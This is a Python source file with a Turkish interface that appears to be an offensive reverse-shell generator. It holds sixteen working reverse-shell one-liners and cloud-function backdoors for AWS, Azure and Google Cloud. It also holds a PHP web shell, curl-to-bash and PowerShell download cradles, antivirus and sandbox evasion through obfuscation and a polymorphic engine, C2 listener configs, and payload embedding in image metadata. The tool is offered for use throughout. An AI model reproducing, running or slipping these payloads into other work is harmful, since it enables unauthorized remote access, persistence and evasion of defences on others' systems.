#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import base64
import random
import string
import hashlib
import json
import zlib
import time
import subprocess
from urllib.parse import quote
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import socket
import struct
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler

class ShellGenerator:
    def __init__(self):
        self.version = "3.0"
        self.config = self.yapilandirma_yukle()
        
    def banner_goster(self):
        banner = """
    ╔═════════════════════════╗
    ║         SHELL           ║
    ╚═════════════════════════╝
        """
        print(banner)

    def yardim_goster(self):
        yardim = """
SHELL v3.0 - Gelişmiş Reverse Shell Oluşturucu

KULLANIM:
  python3 shell.py                    # Interaktif mod
  python3 shell.py --yardim          # Yardım mesajı
  python3 shell.py --hizli IP PORT   # Hızlı shell oluştur

MODLAR ve ÖZELLİKLER:

1. Standart Shell Oluşturma
   - 16+ farklı shell türü
   - Temel reverse shell payload'ları

2. AV Atlama Modu
   - Anti-virus atlama teknikleri
   - Polymorphic engine
   - Sandbox tespiti ve atlama

3. AI Destekli Payload'lar
   - Yapay zeka ile risk analizi
   - Akıllı gizleme önerileri

4. Cloud Entegrasyonu
   - AWS Lambda backdoor
   - Azure Functions shell
   - Google Cloud payload'ları

5. Mobile Payload'lar
   - Android reverse shell
   - iOS payload

6. Protokol Kötüye Kullanımı
   - DNS tunneling shell
   - HTTP web shell
   - SMB paylaşım shell

7. C2 Framework Entegrasyonu
   - Metasploit listener config
   - Cobalt Strike stager
   - Sliver C2 entegrasyonu

8. Web Delivery Şablonları
   - Python web delivery
   - PowerShell downloader
   - cURL + Bash one-liner

9. Toplu Oluşturma
   - Çoklu shell türleri
   - Toplu dosya kaydetme

10. Payload Analizi
    - Risk analizi
    - Güvenlik önerileri

11. Gömülü Payload'lar
    - Resim dosyalarına gömme
    - PDF belgelere embed

12. Çoklu Atlama
    - SSH tunnel konfigürasyonu
    - SOCKS proxy ayarları
        """
        print(yardim)

    def yapilandirma_yukle(self):
        return {
            'sifreleme_anahtari': Fernet.generate_key(),
            'gizleme_seviyesi': 'orta',
            'varsayilan_sablon': 'standart'
        }

    def xor_sifrele(self, veri, anahtar):
        return ''.join(chr(ord(c) ^ ord(anahtar[i % len(anahtar)])) for i, c in enumerate(veri))

    def base64_xor_sifrele(self, veri):
        xor_anahtar = ''.join(random.choices(string.ascii_letters, k=10))
        sifreli = self.xor_sifrele(veri, xor_anahtar)
        return base64.b64encode(f"{xor_anahtar}:{sifreli}".encode()).decode()

    def polimorfik_olustur(self, shell_kodu):
        varyasyonlar = [
            lambda x: x.replace('bash', random.choice(['bash', 'sh', 'shell', '/bin/bash'])),
            lambda x: x.replace('bin', random.choice(['bin', 'usr/bin', ''])),
            lambda x: x + ' # ' + ''.join(random.choices(string.ascii_letters, k=10)),
            lambda x: ' '.join(x.split()),
            lambda x: x.replace('socket', random.choice(['socket', 'sock', 'baglanti'])),
            lambda x: x.replace('exec', random.choice(['exec', 'calistir', 'run'])),
        ]
        
        for varyasyon in random.sample(varyasyonlar, random.randint(2, 4)):
            shell_kodu = varyasyon(shell_kodu)
            
        return shell_kodu

    def sandbox_atlama_ekle(self, shell_kodu):
        atlama_kodu = """
        if [ $(nproc) -lt 2 ]; then exit; fi
        if [ $(free -m | awk '/^Mem:/{print $2}') -lt 1024 ]; then exit; fi
        if [ $(df / | awk 'NR==2{print $2}') -lt 1000000 ]; then exit; fi
        if [ -f "/proc/self/status" ]; then
            if grep -q "docker\\|lxc" /proc/self/cgroup; then exit; fi
        fi
        """
        return atlama_kodu + shell_kodu

    class AIPayloadGenerator:
        def __init__(self):
            self.supheli_patternler = [
                '/bin/sh', 'bash -i', 'socket.socket', 'exec', 'system',
                'Runtime.getRuntime()', 'ProcessBuilder', 'powershell',
                'New-Object', 'IEX', 'Invoke-Expression'
            ]
            
        def payload_analiz(self, payload):
            risk_puani = 0
            tespit_edilenler = []
            
            for pattern in self.supheli_patternler:
                if pattern in payload:
                    risk_puani += 10
                    tespit_edilenler.append(pattern)
            
            return {
                'risk_puani': risk_puani,
                'tespit_edilenler': tespit_edilenler,
                'oneriler': self.oneri_olustur(risk_puani)
            }
        
        def oneri_olustur(self, risk_puani):
            if risk_puani < 20:
                return "Payload temiz görünüyor"
            elif risk_puani < 50:
                return "Temel gizleme önerilir"
            else:
                return "İleri seviye atlama teknikleri uygula"
        
        def akilli_gizle(self, payload, risk_seviyesi):
            if risk_seviyesi == "dusuk":
                return base64.b64encode(payload.encode()).decode()
            elif risk_seviyesi == "orta":
                return self.orta_gizleme(payload)
            else:
                return self.agir_gizleme(payload)
        
        def orta_gizleme(self, payload):
            parcalar = [payload[i:i+10] for i in range(0, len(payload), 10)]
            kodlanmis_parcalar = [base64.b64encode(parca.encode()).decode() for parca in parcalar]
            return f"echo {'.'.join(kodlanmis_parcalar)} | base64 -d | bash"
        
        def agir_gizleme(self, payload):
            b64_kodlu = base64.b64encode(payload.encode()).decode()
            xor_kodlu = self.xor_kodla(b64_kodlu)
            return f"eval `echo {xor_kodlu} | base64 -d | python3 -c \"import sys; data=sys.stdin.read(); print(''.join(chr(ord(c)^0x42) for c in data))\"`"
        
        def xor_kodla(self, veri, anahtar=0x42):
            return ''.join(chr(ord(c) ^ anahtar) for c in veri)

    class CloudEntegrasyon:
        def aws_lambda_backdoor(self, ip, port):
            return f"""
import json
import socket
import subprocess
import os

def lambda_handler(event, context):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('{ip}', {port}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(['/bin/sh', '-i'])
    except Exception as e:
        return {{'statusCode': 200, 'body': str(e)}}
    return {{'statusCode': 200, 'body': 'OK'}}
            """
        
        def azure_fonksiyon_shell(self, ip, port):
            return f"""
import socket
import subprocess
import os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('{ip}', {port}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(['/bin/sh', '-i'])
    except Exception as e:
        return func.HttpResponse(str(e))
    return func.HttpResponse("OK")
            """
        
        def google_cloud_shell(self, ip, port):
            return f"""
import socket
import subprocess
import os

def cloud_shell(request):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('{ip}', {port}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(['/bin/bash', '-i'])
    except Exception as e:
        return str(e)
    return 'OK'
            """

    class MobilePayloadlar:
        def android_shell(self, ip, port):
            return f"""
try {{
    Process process = Runtime.getRuntime().exec("/system/bin/sh");
    DataOutputStream os = new DataOutputStream(process.getOutputStream());
    Socket socket = new Socket("{ip}", {port});
}} catch (Exception e) {{
    e.printStackTrace();
}}
            """
        
        def ios_shell(self, ip, port):
            return f"""
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {{
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {{0}};
    addr.sin_family = AF_INET;
    addr.sin_port = htons({port});
    inet_pton(AF_INET, "{ip}", &addr.sin_addr);
    
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    
    execl("/bin/sh", "sh", NULL);
    return 0;
}}
            """

    class ProtokolKullanimi:
        def dns_tunnel(self, domain, port=53):
            return f"""
./dnscat2 {domain} --dns port={port}
            """
        
        def http_webshell(self, ip, port, path="/shell.php"):
            return f"""
<?php
if(isset($_REQUEST['cmd'])){{
    $output = shell_exec($_REQUEST['cmd']);
    echo "<pre>$output</pre>";
}}
$sock=fsockopen("{ip}",{port});
exec("/bin/sh -i <&3 >&3 2>&3");
?>
            """
        
        def smb_shell(self, ip, paylasim_adi):
            return f"""
impacket-smbserver -smb2support {paylasim_adi} .
            """

    class C2Entegrasyon:
        def __init__(self):
            self.desteklenen_c2 = ['metasploit', 'cobalt_strike', 'sliver']
        
        def metasploit_olustur(self, ip, port, payload_tipi='linux/x64/meterpreter/reverse_tcp'):
            return f"""
use exploit/multi/handler
set PAYLOAD {payload_tipi}
set LHOST {ip}
set LPORT {port}
exploit -j
            """
        
        def cobalt_strike_olustur(self, ip, port):
            return f"""
beacon> socks 1080
beacon> rportfwd {port} {ip} {port}
            """
        
        def sliver_olustur(self, ip, port):
            return f"""
sliver > generate --os linux --arch amd64 --http {ip}:{port}
sliver > http --domain {ip} --port {port}
            """

    def temel_shell_olustur(self, secim, ip, port, secenekler):
        shell_listesi = {
            1: f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            2: f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
            3: f"nc -e /bin/sh {ip} {port}",
            4: f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            5: f"powershell -nop -c \"$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            6: f"socat TCP:{ip}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
            7: f"ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
            8: f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            9: f"go run -c 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'",
            10: f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(1) {{do{{printf \"shell>\" |& s; s |& getline c; if(c){{while ((c |& getline) > 0) print $0 |& s; close(c)}}}} while(c != \"exit\") close(s)}}}}'",
            11: f"telnet {ip} {port} | /bin/sh | telnet {ip} {port}",
            12: f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
            13: f"node -e \"const {{ spawn }} = require('child_process'); const client = require('net').connect({port}, '{ip}', () => {{ const sh = spawn('/bin/sh', []); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }});\"",
            14: f"openssl s_client -quiet -connect {ip}:{port}",
            15: f"dart -e 'import \"dart:io\";main(){{Socket.connect(\"{ip}\",{port}).then((s){{Process.start(\"/bin/sh\",[]).then((p){{s.listen(p.stdin.add);p.stdout.listen(s.add);p.stderr.listen(s.add);}});}});}}'",
            16: f"groovy -e 'import java.net.*; import java.io.*; Socket s=new Socket(\"{ip}\",{port}); Process p=new ProcessBuilder(\"/bin/sh\").redirectErrorStream(true).start(); InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()){{ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); }} s.close();'"
        }
        
        return shell_listesi.get(secim, "Geçersiz shell türü")

    def gelismis_shell_olustur(self, secim, ip, port, secenekler):
        temel_shell = self.temel_shell_olustur(secim, ip, port, secenekler)
        
        ai_motoru = self.AIPayloadGenerator()
        analiz = ai_motoru.payload_analiz(temel_shell)
        
        print(f"[AI Analiz] Risk Puanı: {analiz['risk_puani']}/100")
        print(f"Tespit Edilenler: {analiz['tespit_edilenler']}")
        print(f"Öneriler: {analiz['oneriler']}")
        
        gizleme = secenekler.get('gizleme', 'orta')
        
        if gizleme == 'dusuk':
            return temel_shell
        elif gizleme == 'orta':
            return ai_motoru.orta_gizleme(temel_shell)
        elif gizleme == 'yuksek':
            return self.polimorfik_olustur(temel_shell)
        elif gizleme == 'agir':
            return self.sandbox_atlama_ekle(
                self.polimorfik_olustur(
                    ai_motoru.agir_gizleme(temel_shell)
                )
            )

    def web_sunucu_baslat(self, port=8000):
        def sunucu_baslat():
            os.chdir('/tmp')
            handler = SimpleHTTPRequestHandler
            httpd = HTTPServer(('0.0.0.0', port), handler)
            print(f"[+] Web sunucusu {port} portunda başlatıldı")
            httpd.serve_forever()
        
        thread = threading.Thread(target=sunucu_baslat)
        thread.daemon = True
        thread.start()
        return thread

    def web_delivery_olustur(self, ip, port, method='python'):
        sablonlar = {
            'python': f"python3 -c \"import urllib.request;exec(urllib.request.urlopen('http://{ip}:{port}/shell.py').read())\"",
            'powershell': f"powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{port}/shell.ps1')\"",
            'curl_bash': f"curl -s http://{ip}:{port}/shell.sh | bash",
            'wget_bash': f"wget -q -O- http://{ip}:{port}/shell.sh | bash"
        }
        return sablonlar.get(method, "Desteklenmeyen method")

    def toplu_olustur(self, ip, port, shell_turleri, secenekler):
        sonuclar = {}
        for shell_turu in shell_turleri:
            sonuclar[shell_turu] = self.gelismis_shell_olustur(
                shell_turu, ip, port, secenekler
            )
        return sonuclar

    def payload_analiz(self, payload):
        ai_motoru = self.AIPayloadGenerator()
        analiz = ai_motoru.payload_analiz(payload)
        
        return {
            'uzunluk': len(payload),
            'entropi': self.entropi_hesapla(payload),
            'supheli_kelimeler': analiz['tespit_edilenler'],
            'risk_seviyesi': analiz['risk_puani'],
            'oneriler': analiz['oneriler']
        }
    
    def entropi_hesapla(self, veri):
        if not veri:
            return 0
        entropi = 0
        for x in range(256):
            p_x = float(veri.count(chr(x))) / len(veri)
            if p_x > 0:
                entropi += - p_x * (p_x.bit_length() - 1)
        return entropi

    def gomulu_payload_olustur(self, dosya_turu, shell_kodu, cikti_dosyasi):
        if dosya_turu == 'resim':
            return self.resime_gom(shell_kodu, cikti_dosyasi)
        elif dosya_turu == 'pdf':
            return self.pdfe_gom(shell_kodu, cikti_dosyasi)
        else:
            return "Desteklenmeyen dosya türü"

    def resime_gom(self, shell_kodu, cikti_dosyasi):
        try:
            cmd = f"exiftool -Comment='{base64.b64encode(shell_kodu.encode()).decode()}' {cikti_dosyasi}"
            return f"Resime gömüldü: {cmd}"
        except:
            return "Resime gömme başarısız"

    class PivotYonetici:
        def ssh_tunnel_olustur(self, atlama_makinesi, hedef_ip, hedef_port, yerel_port=1080):
            return f"""
ssh -L {yerel_port}:{hedef_ip}:{hedef_port} {atlama_makinesi}
            """
        
        def socks_proxy_olustur(self, atlama_makinesi, yerel_port=1080):
            return f"""
ssh -D {yerel_port} {atlama_makinesi}
            """

    def ana_menu(self):
        print("\n" + "="*50)
        print("ANA MENÜ - SHELL OLUŞTURUCU")
        print("="*50)
        print("1. Standart Shell Oluşturma")
        print("2. AV Atlama Modu")
        print("3. AI Destekli Payload'lar")
        print("4. Cloud Entegrasyonu")
        print("5. Mobile Payload'lar")
        print("6. Protokol Kötüye Kullanımı")
        print("7. C2 Framework Entegrasyonu")
        print("8. Web Delivery Şablonları")
        print("9. Toplu Oluşturma")
        print("10. Payload Analizi")
        print("11. Gömülü Payload'lar")
        print("12. Çoklu Atlama")
        print("13. Çıkış")
        
        try:
            secim = int(input("\nSeçim yapın (1-13): "))
            return secim
        except ValueError:
            print("Geçersiz giriş!")
            return 13

    def hizli_olustur(self, ip, port):
        print(f"\nHızlı Shell Oluşturma: {ip}:{port}")
        secenekler = {'gizleme': 'orta'}
        payload = self.gelismis_shell_olustur(2, ip, port, secenekler)
        print(f"\nOluşturulan Python Shell:\n{payload}")
        
        if input("\nDosyaya kaydet? (e/H): ").lower() == 'e':
            dosya_adi = f"shell_{ip}_{port}.py"
            with open(dosya_adi, 'w') as f:
                f.write(payload)
            print(f"{dosya_adi} dosyasına kaydedildi")

    def calistir(self):
        if len(sys.argv) > 1:
            if sys.argv[1] == "--yardim" or sys.argv[1] == "-y":
                self.yardim_goster()
                return
            elif sys.argv[1] == "--hizli" and len(sys.argv) == 4:
                ip = sys.argv[2]
                port = sys.argv[3]
                self.hizli_olustur(ip, port)
                return
        
        self.banner_goster()
        
        while True:
            secim = self.ana_menu()
            
            if secim == 1:
                self.standart_olusturma()
            elif secim == 2:
                self.av_atlama_modu()
            elif secim == 3:
                self.ai_destekli_mod()
            elif secim == 4:
                self.cloud_entegrasyon()
            elif secim == 5:
                self.mobile_payloadlar()
            elif secim == 6:
                self.protokol_kullanimi()
            elif secim == 7:
                self.c2_entegrasyon()
            elif secim == 8:
                self.web_delivery()
            elif secim == 9:
                self.toplu_olusturma_menu()
            elif secim == 10:
                self.payload_analiz_menu()
            elif secim == 11:
                self.gomulu_payloadlar()
            elif secim == 12:
                self.pivot_menu()
            elif secim == 13:
                print("Güle güle!")
                break
            else:
                print("Geçersiz seçim!")

    def standart_olusturma(self):
        print("\n=== STANDART SHELL OLUŞTURMA ===")
        ip = input("Dinleyici IP: ")
        port = input("Dinleyici Port: ")
        
        print("\nShell Türleri:")
        shell_turleri = {
            1: "Bash", 2: "Python", 3: "Netcat", 4: "PHP", 5: "PowerShell",
            6: "Socat", 7: "Ruby", 8: "Perl", 9: "Golang", 10: "AWK",
            11: "Telnet", 12: "Lua", 13: "Node.js", 14: "OpenSSL",
            15: "Dart", 16: "Groovy"
        }
        
        for num, isim in shell_turleri.items():
            print(f"{num}. {isim}")
        
        try:
            shell_secim = int(input("\nShell türü seçin (1-16): "))
            secenekler = {'gizleme': 'dusuk'}
            payload = self.gelismis_shell_olustur(shell_secim, ip, port, secenekler)
            
            print(f"\nOluşturulan Payload:\n{payload}")
            
            if input("\nDosyaya kaydet? (e/H): ").lower() == 'e':
                dosya_adi = input("Dosya adı: ")
                with open(dosya_adi, 'w') as f:
                    f.write(payload)
                print(f"{dosya_adi} dosyasına kaydedildi")
                
        except Exception as e:
            print(f"Hata: {e}")

    def av_atlama_modu(self):
        print("\n=== AV ATLAMA MODU ===")
        ip = input("Dinleyici IP: ")
        port = input("Dinleyici Port: ")
        
        print("\nAtlama Teknikleri:")
        print("1. Temel Gizleme")
        print("2. Polimorfik Motor")
        print("3. Sandbox Atlama")
        print("4. Tam Gizlilik Modu")
        
        try:
            atlama_secim = int(input("Teknik seçin (1-4): "))
            teknikler = {1: 'dusuk', 2: 'yuksek', 3: 'orta', 4: 'agir'}
            secenekler = {'gizleme': teknikler.get(atlama_secim, 'orta')}
            
            payload = self.gelismis_shell_olustur(2, ip, port, secenekler)
            print(f"\nAtlama Payload:\n{payload}")
            
        except Exception as e:
            print(f"Hata: {e}")

    def ai_destekli_mod(self):
        print("\n=== AI DESTEKLİ PAYLOAD'LAR ===")
        ip = input("Dinleyici IP: ")
        port = input("Dinleyici Port: ")
        
        ai_motoru = self.AIPayloadGenerator()
        temel_payload = self.temel_shell_olustur(2, ip, port, {})
        
        print("\nAI Analiz Sonuçları:")
        analiz = ai_motoru.payload_analiz(temel_payload)
        for anahtar, deger in analiz.items():
            print(f"{anahtar}: {deger}")
        
        akilli_payload = ai_motoru.akilli_gizle(temel_payload, "yuksek")
        print(f"\nAI Optimize Payload:\n{akilli_payload}")

    def cloud_entegrasyon(self):
        print("\n=== CLOUD ENTEGRASYONU ===")
        ip = input("Dinleyici IP: ")
        port = input("Dinleyici Port: ")
        
        cloud = self.CloudEntegrasyon()
        
        print("\nCloud Platformları:")
        print("1. AWS Lambda")
        print("2. Azure Functions")
        print("3. Google Cloud")
        
        try:
            cloud_secim = int(input("Platform seçin (1-3): "))
            if cloud_secim == 1:
                payload = cloud.aws_lambda_backdoor(ip, port)
            elif cloud_secim == 2:
                payload = cloud.azure_fonksiyon_shell(ip, port)
            elif cloud_secim == 3:
                payload = cloud.google_cloud_shell(ip, port)
            else:
                payload = "Geçersiz seçim"
            
            print(f"\nCloud Payload:\n{payload}")
            
        except Exception as e:
            print(f"Hata: {e}")

    def mobile_payloadlar(self):
        print("\n=== MOBILE PAYLOAD'LAR ===")
        ip = input("Dinleyici IP: ")
        port = input("Dinleyici Port: ")
        
        mobile = self.MobilePayloadlar()
        
        print("\nMobil Platformlar:")
        print("1. Android")
        print("2. iOS")
        
        try:
            mobile_secim = int(input("Platform seçin (1-2): "))
            if mobile_secim == 1:
                payload = mobile.android_shell(ip, port)
            elif mobile_secim == 2:
                payload = mobile.ios_shell(ip, port)
            else:
                payload = "Geçersiz seçim"
            
            print(f"\nMobil Payload:\n{payload}")
            
        except Exception as e:
            print(f"Hata: {e}")

    def protokol_kullanimi(self):
        print("\n=== PROTOKOL KÖTÜYE KULLANIMI ===")
        ip = input("Hedef IP/Domain: ")
        port = input("Port: ")
        
        protokol = self.ProtokolKullanimi()
        
        print("\nProtokoller:")
        print("1. DNS Tunneling")
        print("2. HTTP Web Shell")
        print("3. SMB Shell")
        
        try:
            proto_secim = int(input("Protokol seçin (1-3): "))
            if proto_secim == 1:
                payload = protokol.dns_tunnel(ip, port)
            elif proto_secim == 2:
                payload = protokol.http_webshell(ip, port)
            elif proto_secim == 3:
                paylasim = input("Paylaşım adı: ")
                payload = protokol.smb_shell(ip, paylasim)
            else:
                payload = "Geçersiz seçim"
            
            print(f"\nProtokol Payload:\n{payload}")
            
        except Exception as e:
            print(f"Hata: {e}")

    def c2_entegrasyon(self):
        print("\n=== C2 FRAMEWORK ENTEGRASYONU ===")
        ip = input("C2 Sunucu IP: ")
        port = input("C2 Sunucu Port: ")
        
        c2 = self.C2Entegrasyon()
        
        print("\nC2 Framework'leri:")
        for i, framework in enumerate(c2.desteklenen_c2, 1):
            print(f"{i}. {framework}")
        
        try:
            c2_secim = int(input("Framework seçin (1-3): "))
            frameworkler = ['metasploit', 'cobalt_strike', 'sliver']
            secilen_framework = frameworkler[c2_secim-1] if 1 <= c2_secim <= 3 else 'metasploit'
            
            if secilen_framework == 'metasploit':
                payload = c2.metasploit_olustur(ip, port)
            elif secilen_framework == 'cobalt_strike':
                payload = c2.cobalt_strike_olustur(ip, port)
            elif secilen_framework == 'sliver':
                payload = c2.sliver_olustur(ip, port)
            else:
                payload = f"{secilen_framework} konfigürasyonu"
            
            print(f"\nC2 Konfigürasyonu:\n{payload}")
            
        except Exception as e:
            print(f"Hata: {e}")

    def web_delivery(self):
        print("\n=== WEB DELIVERY ŞABLONLARI ===")
        ip = input("IP Adresiniz: ")
        port = input("Web Sunucu Port: ")
        
        print("\nDelivery Methodları:")
        print("1. Python")
        print("2. PowerShell")
        print("3. cURL + Bash")
        print("4. wget + Bash")
        
        try:
            method_secim = int(input("Method seçin (1-4): "))
            methodlar = ['python', 'powershell', 'curl_bash', 'wget_bash']
            secilen_method = methodlar[method_secim-1] if 1 <= method_secim <= 4 else 'python'
            
            payload = self.web_delivery_olustur(ip, port, secilen_method)
            print(f"\nWeb Delivery Payload:\n{payload}")
            
            if input("\nWeb sunucusu başlatılsın mı? (e/H): ").lower() == 'e':
                self.web_sunucu_baslat(int(port))
                print(f"Web sunucusu http://{ip}:{port} adresinde başlatıldı")
                print("Shell dosyanızı /tmp/ dizinine yerleştirin")
                
        except Exception as e:
            print(f"Hata: {e}")

    def toplu_olusturma_menu(self):
        print("\n=== TOPLU OLUŞTURMA ===")
        ip = input("Dinleyici IP: ")
        port = input("Dinleyici Port: ")
        
        print("\nShell türlerini seçin (virgülle ayırın):")
        print("1:Bash, 2:Python, 3:Netcat, 4:PHP, 5:PowerShell, 6:Socat, 7:Ruby, 8:Perl")
        
        try:
            secimler = input("Shell türleri (örn: 1,2,3): ").split(',')
            shell_turleri = [int(x.strip()) for x in secimler]
            
            secenekler = {'gizleme': 'orta'}
            sonuclar = self.toplu_olustur(ip, port, shell_turleri, secenekler)
            
            print("\nToplu Oluşturma Sonuçları:")
            for shell_turu, payload in sonuclar.items():
                print(f"\n{shell_turu}: {payload}")
                
            if input("\nTümünü dosyaya kaydet? (e/H): ").lower() == 'e':
                for shell_turu, payload in sonuclar.items():
                    dosya_adi = f"shell_{shell_turu}.txt"
                    with open(dosya_adi, 'w') as f:
                        f.write(payload)
                    print(f"{dosya_adi} kaydedildi")
                    
        except Exception as e:
            print(f"Hata: {e}")

    def payload_analiz_menu(self):
        print("\n=== PAYLOAD ANALİZİ ===")
        payload = input("Payload'ı yapıştırın: ")
        
        analiz = self.payload_analiz(payload)
        
        print("\nAnaliz Sonuçları:")
        for anahtar, deger in analiz.items():
            print(f"{anahtar}: {deger}")

    def gomulu_payloadlar(self):
        print("\n=== GÖMÜLÜ PAYLOAD'LAR ===")
        ip = input("Dinleyici IP: ")
        port = input("Dinleyici Port: ")
        
        shell_kodu = self.temel_shell_olustur(2, ip, port, {})
        
        print("\nGömme Seçenekleri:")
        print("1. Resim Dosyası")
        print("2. PDF Belgesi")
        
        try:
            gomme_secim = int(input("Seçenek seçin (1-2): "))
            dosya_turleri = ['resim', 'pdf']
            secilen_tur = dosya_turleri[gomme_secim-1] if 1 <= gomme_secim <= 2 else 'resim'
            
            cikti_dosyasi = input("Çıktı dosya adı: ")
            sonuc = self.gomulu_payload_olustur(secilen_tur, shell_kodu, cikti_dosyasi)
            
            print(f"\nGömme Sonucu:\n{sonuc}")
            
        except Exception as e:
            print(f"Hata: {e}")

    def pivot_menu(self):
        print("\n=== ÇOKLU ATLAMA ===")
        pivot = self.PivotYonetici()
        
        print("\nAtlama Methodları:")
        print("1. SSH Tunnel")
        print("2. SOCKS Proxy")
        
        try:
            pivot_secim = int(input("Method seçin (1-2): "))
            
            if pivot_secim == 1:
                atlama_makinesi = input("Atlama makinesi: ")
                hedef_ip = input("Hedef IP: ")
                hedef_port = input("Hedef port: ")
                yerel_port = input("Yerel port (varsayılan 1080): ") or "1080"
                
                config = pivot.ssh_tunnel_olustur(atlama_makinesi, hedef_ip, hedef_port, yerel_port)
            elif pivot_secim == 2:
                atlama_makinesi = input("Atlama makinesi: ")
                yerel_port = input("Yerel port (varsayılan 1080): ") or "1080"
                config = pivot.socks_proxy_olustur(atlama_makinesi, yerel_port)
            else:
                config = "Geçersiz seçim"
            
            print(f"\nAtlama Konfigürasyonu:\n{config}")
            
        except Exception as e:
            print(f"Hata: {e}")

def main():
    try:
        generator = ShellGenerator()
        generator.calistir()
    except KeyboardInterrupt:
        print("\n[!] Program kullanıcı tarafından durduruldu")
    except Exception as e:
        print(f"\n[!] Kritik hata: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    try:
        import cryptography
    except ImportError:
        print("Gerekli bağımlılıklar yükleniyor...")
        os.system("pip3 install cryptography")
    
    main()
